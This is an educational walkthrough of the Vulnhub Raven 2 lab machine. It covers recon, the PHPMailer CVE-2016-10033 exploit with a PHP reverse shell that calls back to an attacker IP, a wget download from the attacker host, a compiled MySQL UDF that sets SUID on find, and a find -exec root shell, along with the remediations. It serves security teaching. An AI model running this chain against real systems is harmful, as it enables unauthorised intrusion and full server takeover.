
# Detailed Notes — Lab 06: Raven 2

This file is the **extended edition** of `README.md`. The original text is preserved **in full**, and each section is followed by an *"Explanation"* box containing theory, a breakdown of the commands, and the points that require particular attention.

**Why Raven 2 is the "next step" after Raven 1**

| | Raven 1 | Raven 2 |
| :--- | :--- | :--- |
| Initial access | Weak SSH password | **Vulnerability in a library** (PHPMailer) |
| Intermediate stage | MySQL for flags | MySQL for **privesc** |
| Escalation | Password reuse | **MySQL UDF → SUID** |
| Skills | enumeration, hydra, john | exploit code, compilation, SQL file write |

In other words, nothing here was "guessed" — we **exploited code**. This is the first lab in which you write/compile an exploit.

**What you will learn**

1. How a library (PHPMailer) becomes an attack surface even when the application itself is correct.
2. How a **reverse shell** with `nc` works and why a TTY is required.
3. How credentials are read from `wp-config.php`.
4. How a MySQL server running as root can be turned into command execution (UDF).
5. Why SUID on `find` appears once again — and why it is a perennial mistake.

---

# Educational Handbook on Information Systems Security: Analysis of Raven 2 (Vulnhub)

## 1. Introduction
This document is a detailed technical guide to solving the **Raven 2** virtual machine, which is available through the Vulnhub platform. Raven 2 is classified as a "Beginner/Intermediate" boot2root machine. The objective of the exercise is to capture four (4) digital flags and, ultimately, to fully compromise the system by obtaining superuser (root) privileges.

> **Source / Download:** [VulnHub — Raven: 2](https://www.vulnhub.com/entry/raven-2,269/), **Reference writeup:** [Hacking Articles — Raven 2: Vulnhub Walkthrough](https://www.hackingarticles.in/raven-2-vulnhub-walkthrough/)

---

## 2. Network Reconnaissance and Port Scanning


### Explanation §2 — two different questions

**`netdiscover`** answers "*who is there*" (L2, ARP). **`nmap -A`** answers "*what is running*" (L3/L4 + scripts). Neither replaces the other.

**Breakdown of `nmap -A`** (image `image-3.png`):

| Parameter | What it adds |
| :--- | :--- |
| `-A` | Enables `-sV` + `-sC` + OS detection + traceroute |
| `-sV` | Service versions (OpenSSH 6.7p1, Apache 2.4.10) |
| `-sC` | Default scripts (banners, http-title) |
| `-O` (part of -A) | Guesses the operating system (Linux 3.x/4.x) |

**What we read in the output:**

```
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
```

* **Debian 8 (Jessie)** — old and EOL.
* **Apache 2.4.10** — an old version, but not the main problem.
* `http-title: Raven Security` — nmap reads the page title, confirming a web application.

**Why we also check port 111 (rpcbind):** it often conceals NFS exports. Here it leads nowhere, but the habit of "checking every open port" is the correct one.

**Methodological comparison:** in Raven 1 the first thought was "WordPress"; here nmap reports only Apache. The difference will emerge during the enumeration of the web content.

The initial phase of every penetration test requires identifying the target on the local network.

![Network scan with netdiscover](../../06.%20Raven2-CTF/images/image.png)

*Figure 1 — Network scan with `netdiscover`: the host `192.168.1.101` was identified, with MAC Vendor "VMware, Inc.".*

Once the target's IP address has been found (`192.168.1.101` in this scenario), a detailed scan is performed to identify open ports and active services.

```bash
nmap -A 192.168.1.101
```

![nmap -A scan](../../06.%20Raven2-CTF/images/image-3.png)

*Figure 2 — `nmap -A`: identification of the operating system, service versions, and traceroute.*

* `nmap`: The industry standard for network mapping (Network Mapper).
* `-A`: The "Aggressive" option. It is a composite option that simultaneously enables operating system detection (OS detection), service version detection (Version detection), script scanning (Script scanning), and route tracing (Traceroute).
* `192.168.1.101`: The IP address of the target system.

The scan revealed three open ports: 22 (SSH), 80 (HTTP), and 111 (RPC).

---

## 3. Web Enumeration


### Explanation §3 — from the home page to the `/vendor` directory

**`dirb`** is a content scanner: it tries names from a wordlist and reports anything that responds with 200/301/403.

```bash
dirb http://192.168.1.101/
```

In image `image-4.png` you can see results such as `/css/`, `/js/`, `/manual/`, **`/vendor/`**, and `/wordpress/`. The interesting one is `/vendor/`: in PHP projects it is the **dependencies** directory (Composer).

**Why `/vendor/` is "gold":** it contains third-party libraries. If it has not been removed from the web root (or does not have `deny from all`), then:

* their **names and versions** can be read (`VERSION`, `composer.json`)
* sometimes **test files** or READMEs containing useful information can be read as well.

**Image `image-5.png`** shows the index of `/vendor/`:

```
LICENSE   PATH   PHPMailerAutoload.php   README.md
SECURITY.md   VERSION   class.phpmailer.php ...
```

Two indicators: **`PATH`** (a suspicious file that does not belong to a library) and **`PHPMailerAutoload.php`** (hence PHPMailer).

**Library vulnerability analysis — the correct order:**

1. Which library? (`PHPMailer`)
2. Which version? (`VERSION` → 5.2.6)
3. Is there a known CVE? (`searchsploit phpmailer`, NVD)
4. Is the functionality **reachable** from outside? (is there a contact form?)

**Flag 1** is located in `/vendor/PATH` (image `image-6.png`) — that is, in a file that **should not** be public.

Since an HTTP service was identified on port 80, the next step is to map the structure of the website.

![Raven Security website identified](../../06.%20Raven2-CTF/images/image-1.png)

*Figure 3 — The Raven Security website identified on port 80.*

To uncover hidden directories, a dictionary-based attack technique (brute-forcing) is used.

```bash
dirb http://192.168.1.101/
```

* `dirb`: A specialized web application scanning tool (Web Content Scanner). It works by sending a continuous stream of HTTP GET requests built from words in a predefined wordlist, looking for responses such as 200 OK or 403 Forbidden.
* `http://192.168.1.101/`: The base URI (Uniform Resource Identifier) of the target.

![dirb scan results](../../06.%20Raven2-CTF/images/image-4.png)

*Figure 4 — `dirb` scan results: the `/vendor/` directory was identified (as well as `/wordpress/`).*

The scan indicated the existence of the `/vendor` directory. On browsing to this directory, files of particular interest were found.

![The /vendor directory](../../06.%20Raven2-CTF/images/image-5.png)

*Figure 5 — The index of `/vendor/`: `PATH`, `VERSION`, `PHPMailerAutoload.php`, `class.phpmailer.php`.*

* **`PATH` file**: Viewing it revealed the first flag (Flag 1).

![Contents of the PATH file](../../06.%20Raven2-CTF/images/image-6.png)

*Figure 6 — `flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}` inside `/vendor/PATH`.*

* **`VERSION` file**: It indicated version 5.2.6. Combined with the presence of the `PHPMailerAutoload.php` file, this leads to the conclusion that the system uses the **PHPMailer library, version 5.2.6**.

---

## 4. Initial Access


### Explanation §4 — CVE-2016-10033 in plain terms

**What PHPMailer is:** the most popular email-sending library for PHP. It is used by thousands of applications, including contact forms.

**The vulnerability (CVE-2016-10033):** PHP's `mail()` function passes the `-f` parameter (envelope sender) to the `sendmail` binary. PHPMailer allowed the user to influence this value. With crafted input (e.g., injecting additional parameters by means of spaces/quotes), it is possible to add **`-X`**, which writes a log to a file — and thereby create a **PHP file** on the server.

**The chain:**

```
contact form  →  PHPMailer 5.2.6  →  sendmail -X /var/www/html/shell.php
              →  Apache serves shell.php  →  RCE
```

**Exploit 40974 (Exploit-DB)** — image `image-7.png` — is written in **Python** and must be configured (image `image-8.png`):

| Variable | What it defines | Example |
| :--- | :--- | :--- |
| `target` | URL that invokes PHPMailer | `http://192.168.1.101/contact.php` |
| `backdoor` | Name of the file to be written | `shell.php` |
| `payload` | PHP code of the reverse shell | `<?php … fsockopen … ?>` |
| IP/port | Where it will connect back to | `192.168.1.109:4444` |

**Breakdown of the payload:** it opens a socket (`fsockopen`), duplicates stdin/stdout/stderr onto it (`dup2`), and executes `/bin/sh`. It is the classic one-liner reverse shell.

**The listener — `nc -lvp 4444`** (image `image-10.png`):

| Flag | Meaning |
| :--- | :--- |
| `-l` | listen |
| `-v` | verbose |
| `-p 4444` | port |

**The message `can't access tty; job control turned off`** is not an error; it indicates that we have a **dumb shell**. This is why the following step is performed:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

(image `image-11.png`). The prompt `www-data@Raven:/var/www/html$` shows that access has been obtained as the web user.

**Flag 2** is read from `/var/www/flag2.txt` (image `image-12.png`).

**The lesson:** an **up-to-date library** (5.2.18+) would have stopped everything — without changing a single line of the application.

PHPMailer 5.2.6 is known to contain a critical vulnerability that permits Remote Code Execution (RCE).

![Exploit-DB 40974 for PHPMailer](../../06.%20Raven2-CTF/images/image-7.png)

*Figure 7 — Exploit-DB **40974** (CVE-2016-10033): PHPMailer < 5.2.18 Remote Code Execution (Python).*

![Modifying the exploit code](../../06.%20Raven2-CTF/images/image-8.png)

*Figure 8 — Modifying the Python exploit code: `# coding: utf-8`, `target`, `backdoor`, and the IP for the reverse shell.*

After downloading a suitable Python exploit, the following modifications are required:
1. Add the encoding declaration: `# coding: utf-8`.
2. Specify the target URI (e.g., `/contact.php`).
3. Specify the name of the malicious file (backdoor.php).
4. Enter the attacker's IP address in order to establish the reverse connection (reverse shell).

![Running the exploit](../../06.%20Raven2-CTF/images/image-9.png)

*Figure 9 — Running the exploit: "SeNdіNg eViL sHeLL… SpAwnIng eViL sHeLL…" and `ExPloiTeD http://192.168.1.101/contact.php`.*

We now need to set up the listener and navigate to the backdoor's location, which in our case is rev.php. We can do this by starting netcat on port 4444 (the default) and browsing to ip-address/rev.php. If all of this has been done correctly, we should obtain a shell on the web server.

![Receiving the reverse shell](../../06.%20Raven2-CTF/images/image-10.png)

*Figure 10 — Receiving the reverse shell: `nc -lvp 4444` and the connection from the web server.*

A detailed explanation of each element follows:

- Listener: A program that runs on the attacker's/tester's computer and "listens" on a specific port, waiting for an incoming connection from the target computer.

- Netcat (nc): The tool used to create the listener. It is a well-known networking utility that can read and write data over network connections. Port 4444 is frequently used as the default in many security tools (such as Metasploit).

- Backdoor / rev.php: A file (in this case written in PHP, hence the .php extension) that has already been uploaded to the web server by the attacker. When someone visits this page (i.e., browses to ip-address/rev.php), the code is executed on the server.

- The Reverse Shell Process: Instead of the attacker attempting to connect directly to the server (which is usually blocked by firewalls), the attacker causes the server to connect back to them. First, the attacker sets up Netcat (the listener) on their own computer. Then, they open rev.php in the browser. This file instructs the server to connect to the Netcat instance waiting on port 4444.

- Shell on the web server: If the connection succeeds, Netcat is attached to the server's command line (shell). From that moment on, the user can type commands on their own computer and have them executed directly on the web server.

To stabilize the terminal and convert it into a fully interactive TTY (Teletype), the following command is executed:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![Upgrading to a full TTY](../../06.%20Raven2-CTF/images/image-11.png)

*Figure 11 — Upgrading the "blind" shell to an interactive TTY and setting `TERM=xterm`.*

* `python -c`: Instructs the Python interpreter to execute the code that follows, supplied as a string (inline command).
* `import pty; pty.spawn("/bin/bash")`: Imports the `pty` library (pseudo-terminal utilities) and calls the `spawn` method to start a new `/bin/bash` shell process attached to a pseudo-terminal. This resolves display and interaction problems in "blind" shells.

Subsequently, using navigation commands (`cd /var/www`), the second flag (Flag 2) was retrieved.

![Retrieving flag2](../../06.%20Raven2-CTF/images/image-12.png)

*Figure 12 — Retrieving the second flag from `/var/www/flag2.txt`.*

---

## 5. Privilege Escalation


### Explanation §5 — strategy before commands

As `www-data`, we look for **what the web user can read/execute** that it should not be able to. Order of checks:

| Check | What it reveals |
| :--- | :--- |
| `id`, `sudo -l` | Privileges (usually none for www-data) |
| `cat /etc/passwd` | System users |
| `ls -la /var/www/html` | Configuration files (wp-config.php) |
| `find / -perm -u=s` | SUID binaries |
| `crontab -l`, `/etc/cron*` | Jobs that run as root |
| `ps aux` | Services that run as root (MySQL!) |

**The critical observation on this machine:** **MySQL runs as root**. This is not a minor detail — it is the key to the escalation, because every operation the database performs (e.g., writing a file) is carried out with root privileges.

### 5.1 System Enumeration


#### Explanation 5.1 — from `wp-config.php` to LinEnum

**Why `wp-config.php` is critical:**

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_HOST', 'localhost');
```

| Information | Why it matters |
| :--- | :--- |
| User `root` | MySQL runs as root → UDF = root |
| Password | Access to the database |
| Host `localhost` | Connection from inside (socket), not over the network |

**Breakdown of `LinEnum.sh`:**

```bash
cd /tmp                                  # writable directory
wget http://192.168.1.109/LinEnum.sh     # download from the attacker
chmod 777 LinEnum.sh                     # ⚠️ bad practice (see below)
./LinEnum.sh
```

* **`/tmp`** is the only location where an unprivileged user can easily write.
* **`wget`** "pulls" from the attacker: the target initiates the connection outward (outbound traffic) — which is why it works even when a firewall is present.
* **`chmod 777`** grants full permissions to **all** users on the system. A better choice is `chmod 700`. On a real machine, `777` in `/tmp` is a vulnerability in its own right (another user could replace the script).
* **`./`** is required because the current directory is not in `PATH`.
* **`LinEnum`** reports: kernel, users, sudo, SUID, cron, networking, writable files.

**What to look for in the output:** "SUID files", "MySQL running as", "Files with credentials", "Writable /etc". Here it leads to two findings: the MySQL root password and a MySQL server running as root.
While exploring the WordPress directory, the configuration file `wp-config.php` was located. Examining it yielded the password of the database root user (`R@v3nSecurity`).

For further analysis of the operating system's internal configuration, the automated script `LinEnum.sh` was used.

```bash
cd /tmp
wget http://192.168.1.109/LinEnum.sh
chmod 777 LinEnum.sh
./LinEnum.sh
```

* `cd /tmp`: Changes to the temporary files directory, which normally allows ordinary users to write to it.
* `wget http://192.168.1.109/LinEnum.sh`: Downloads the tool from the attacker's server over HTTP (the IP addresses are illustrative).
* `chmod 777 LinEnum.sh`: Changes the file's permissions, granting read, write, and execute (Read/Write/Execute) permissions to all users.
* `./LinEnum.sh`: Executes the script.

### 5.2 MySQL UDF Exploitation (CVE-2016-6662)


#### Explanation 5.2 — UDF: when the database becomes an "agent" of root

**What a UDF (User Defined Function) is:** a MySQL extension that allows **C code** to be invoked from SQL. The administrator loads a library (`.so`) and then uses it like a function.

**Why it becomes a vulnerability:** if you can **write** a `.so` file to the plugins directory and then load it, you execute arbitrary code — with the privileges of MySQL (here: **root**).

**The original sequence, step by step:**

```sql
use mysql;                                                    -- 1
create table foo(line blob);                                  -- 2
insert into foo values(load_file('/tmp/1518.so'));            -- 3
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';  -- 4
create function do_system returns integer soname '1518.so';   -- 5
select do_system('chmod u+s /usr/bin/find');                   -- 6
```

| Step | What happens | Why it is done this way |
| :--- | :--- | :--- |
| 1 | Select the `mysql` database | The `func` table resides there |
| 2 | Temporary table with a `blob` column | Stores binary data in SQL |
| 3 | `load_file()` | Reads a local file **as MySQL** (root privileges!) |
| 4 | `dumpfile` | Writes the blob to a file on the system |
| 5 | `create function … soname` | Registers the UDF — loads the `.so` |
| 6 | `do_system('…')` | Executes a system command |

**Why `dumpfile` and not `outfile`:** `outfile` adds escapes/newlines and **corrupts** binaries. `dumpfile` writes byte for byte.

**Compilation:**

```bash
searchsploit -m 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc
```

| Parameter | Reason |
| :--- | :--- |
| `-shared` | Produces a **shared library** (`.so`), not an executable |
| `-soname,1518.so` | The "logical" name that MySQL will request |
| `-lc` | Links against libc (for `system()`) |
| `-g` | Debug symbols (optional, for analysis) |

**Why it works only when MySQL runs as root:** `load_file` and `dumpfile` read/write **with the privileges of the mysqld process**. If MySQL ran as `mysql`, it could write only where the `mysql` user has permission — and `/usr/lib/mysql/plugin` would be inaccessible.

**Image `image-13.png`** shows the connection (`mysql -u root -p`) and the output of `SHOW DATABASES`. The password `R@v3nSecurity` comes from `wp-config.php`.

**How it is fixed:** run MySQL/MariaDB as `mysql` (not root), set `secure_file_priv` to a specific directory, make `plugin_dir` non-writable, and apply updates (CVE-2016-6662 affects MySQL ≤ 5.7.15 / MariaDB ≤ 10.1.17).
In accordance with the principle of least privilege, services such as MySQL should run under their own dedicated user accounts without elevated privileges (e.g., a user named mysql). When MySQL runs as root, any action performed by the database engine interacts with the operating system using root-level privileges. If an attacker finds a way to make the database execute system commands or write files, they immediately gain full control of the server.

The analysis revealed a vulnerability in the MySQL service that allows system commands to be executed as root through the use of shared libraries (UDF - User Defined Functions). The exploit code has the identifier `1518.c` in Exploit-DB.

```bash
searchsploit -m 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc
```

* `searchsploit -m`: Searches for and copies (mirrors) the exploit's source code into the current directory.
* `gcc`: The GNU Compiler Collection.
* `-g`: Generates debugging information.
* `-shared`: Creates a shared object (dynamic library), which is necessary for loading by MySQL.
* `-Wl,-soname,1518.so`: Passes options to the linker, setting the "logical" name of the library.
* `-o 1518.so`: Specifies the name of the final output file.
* `1518.c`: The source file.
* `-lc`: Links against the core C library (libc).

Once the compiled `.so` file has been transferred to the target (via `wget`), a connection to MySQL is established:

```bash
mysql -u root -p
```

![Connecting to MySQL](../../06.%20Raven2-CTF/images/image-13.png)

*Figure 13 — Connecting to MySQL as `root` and running `SHOW DATABASES`: the `wordpress` database exists.*

* `mysql`: The database's command-line interface.
* `-u root`: Specifies the user (based on the credentials that were found).
* `-p`: Prompts for the password (R@v3nSecurity).

Within the SQL environment, the following statements are executed:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname '1518.so';
select do_system('chmod u+s /usr/bin/find');
```

1. A temporary table `foo` is created with a field of type `blob` (Binary Large Object) to store binary data.
2. The binary file `1518.so` is loaded from the `/tmp` folder into the table.
3. The content is exported (`dumpfile`) into MySQL's vulnerable plugins directory.
4. The function `do_system` is created, drawing its functionality (soname) from the library that has just been implanted.
5. The `do_system` function is called to execute the command `chmod u+s /usr/bin/find`. This sets the **SUID (Set-User-ID) bit** on the `find` executable, allowing any user to run it with the privileges of the file's owner (that is, root).

---

## 6. Final Compromise (Root Access) & Flag Retrieval


### Explanation §6 — SUID again, and completion

**Why `chmod u+s /usr/bin/find` is a "gift":** `find` is a **general-purpose** tool that executes commands (`-exec`). With SUID set, every command it executes runs as root. This is the same pattern as in DC-1 — and it shows that the mistake recurs on real machines.

**The command:**

```bash
touch raj                                   # create a decoy file
find raj -exec "/bin/sh" \;                 # find (SUID root) executes sh
```

**Breakdown:**

* `touch raj` — **at least one** file is needed for `-exec` to "fire". Without a match, nothing is executed.
* `-exec "/bin/sh" \;` — for every matching file, it starts a shell. Because `find` has EUID 0, the shell also inherits EUID 0.
* `\;` terminates the parameter (escaped from our own shell).

**Flags 3 and 4:**

| Flag | Location | What it shows |
| :--- | :--- | :--- |
| 3 | `/var/www/html/wp-content/uploads/2018/11/` | WordPress uploads are accessible and often contain "junk" |
| 4 | `/root/` | Proof of full control |

**Why flag 3 is instructive:** the `uploads` directory must allow **reading** in order to serve images, but not PHP execution. If it allows execution, every upload becomes a backdoor. This is the same mechanism we used in §4.

**The complete chain in a single picture:**

```
PHPMailer 5.2.6 (CVE-2016-10033) → www-data
      ↓ wp-config.php
MySQL root (R@v3nSecurity) → UDF (CVE-2016-6662) → chmod u+s find
      ↓
find -exec /bin/sh → root → flags 3, 4
```

**Both critical points are matters of *configuration*, not "hacking magic":** an unpatched library and a database with excessive privileges. That is the message of this lab.

By exploiting the `find` executable, which now carries the SUID bit, commands are executed as the superuser.

```bash
touch raj
find raj -exec "/bin/sh" \;
```

* `touch raj`: Creates an empty file (or updates its timestamp) named "raj". This is required as a "decoy" so that the `find` command has something to find.
* `find raj`: Invokes the `find` utility to locate the file "raj".
* `-exec "/bin/sh" \;`: For every file it finds, executes the command that follows. Here, it starts a shell (`/bin/sh`). The `\;` marks the end of the `-exec` parameter. Since `find` now runs with root privileges (owing to SUID), the resulting shell inherits these unrestricted privileges.

From within this high-privilege environment, flag 4 (Flag 4) was located in the `/root` directory. Finally, flag 3 (Flag 3) was found stored within the WordPress directory structure (`/var/www/html/wp-content/uploads/2018/11`).

---

---


## Appendix A — Command Map

| Purpose | Command |
| :--- | :--- |
| Target discovery | `netdiscover -r 192.168.1.0/24` |
| Scanning | `nmap -A 192.168.1.101` |
| Directory scanning | `dirb http://192.168.1.101/` |
| Library check | `curl http://…/vendor/VERSION` |
| Exploit search | `searchsploit phpmailer` |
| Listener | `nc -lvp 4444` |
| Shell stabilization | `python -c 'import pty; pty.spawn("/bin/bash")'` |
| Enumeration script | `./LinEnum.sh` |
| MySQL | `mysql -u root -p` |
| UDF compilation | `gcc -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc` |
| Root via SUID | `find raj -exec "/bin/sh" \;` |

## Appendix B — Glossary

| Term | Meaning |
| :--- | :--- |
| **Vendor directory** | Dependencies directory (Composer) — often public by mistake |
| **Envelope sender** | Return address passed to `sendmail` (`-f`) |
| **Reverse shell** | The target connects back to the attacker |
| **TTY / PTY** | Terminal / pseudo-terminal |
| **UDF** | MySQL User Defined Function (C code in a `.so`) |
| **soname** | Logical name of a shared library |
| **dumpfile** | Byte-for-byte writing of binary data |
| **SUID** | Execution with the owner's privileges |
| **EOL** | End of Life — software that no longer receives updates |

## Appendix C — Self-Assessment Questions

1. Why should the `/vendor/` directory not be accessible from the web?
2. Describe CVE-2016-10033 in three sentences (what, how, outcome).
3. What does `-X` do in `sendmail`, and why does it lead to RCE?
4. Why is `pty.spawn` needed, and what does `export TERM=xterm` change?
5. Explain why MySQL's `load_file` does not "see" the permission restrictions of `www-data`.
6. Why is `outfile` unsuitable for binary files?
7. Which **two** settings would defeat the UDF attack?
8. Why is `find -exec` more dangerous than a SUID tool such as `passwd`?

### Suggested Answers

1. `/vendor/` contains third-party libraries (Composer) with **known versions and potential CVEs** (e.g., PHPMailer). If it is accessible from the web, an attacker can read the versions (`VERSION` files) and identify vulnerabilities, or execute vulnerable scripts directly. It is not user-facing content, so it should be blocked by the web server.
2. It is a **remote code execution vulnerability in PHPMailer** (<5.2.18). It arises because the sender address is passed, insufficiently sanitized, as a **command-line parameter** to `sendmail`, allowing the injection of additional parameters (e.g., `-X`). Outcome: the attacker writes a file (webshell) to disk and executes code as the web server user.
3. `-X <file>` instructs sendmail to write a **log of the entire session** to the specified file. If the attacker controls the content of the email (placing PHP code in the body) and, through the injection, sets `-X /var/www/.../shell.php`, a `.php` file containing malicious code is written to the webroot and is executed when visited through a browser. In this way, log-to-file becomes a webshell write, i.e., RCE.
4. The initial reverse shell is non-interactive (no TTY), so `su`, `sudo`, editors, and job control do not work properly. `python -c 'import pty; pty.spawn("/bin/bash")'` provides a real PTY. `export TERM=xterm` sets the terminal type so that programs relying on curses/colors/screen clearing (`clear`, `vi`, `less`) work correctly without an "unknown terminal" error.
5. `LOAD_FILE()` is executed by the **mysqld process**, not by www-data. Files are therefore read with the privileges of the user under which MySQL runs (here **root**) — not under the restrictions of www-data. This is why an attacker with the `FILE` privilege can read files that www-data could not (and, if MySQL runs as root, write anywhere).
6. `INTO OUTFILE` is intended for **text**: it escapes special characters (newlines, tabs, NUL) and may alter bytes, destroying the binary structure (e.g., of a `.so`). For binaries (such as the compiled `raptor_udf2.so`) we use **`INTO DUMPFILE`**, which writes the content **raw**, on a single line, without any conversion.
7. (1) **MySQL not running as root** (`user=mysql` in `my.cnf`) — even if the UDF is loaded, it does not obtain root on the OS. (2) **`secure_file_priv`** set to a restricted/empty directory (or removal of the `FILE` privilege) — this prevents the `.so` from being written to `plugin_dir`. (Additionally: write permission on the plugin directory for root only.)
8. `passwd` performs **a single predefined** task and does not expose any mechanism for executing arbitrary commands. `find -exec` executes **any** command with the (root) privileges granted by SUID, providing an immediate escape to a root shell. The risk is not SUID as such, but the capability for general-purpose code execution.

## Appendix D — Checklist

- [ ] Scanning and service identification
- [ ] Directory fuzzing (at least `common.txt`)
- [ ] Check library versions in `/vendor/`
- [ ] Search for CVEs for each version
- [ ] Correct exploit configuration (target, IP, port)
- [ ] Listener ready **before** execution
- [ ] Shell stabilization (PTY + TERM)
- [ ] Read `wp-config.php` / config files
- [ ] Check whether MySQL runs as root
- [ ] Document the attack chain and the recommended fixes
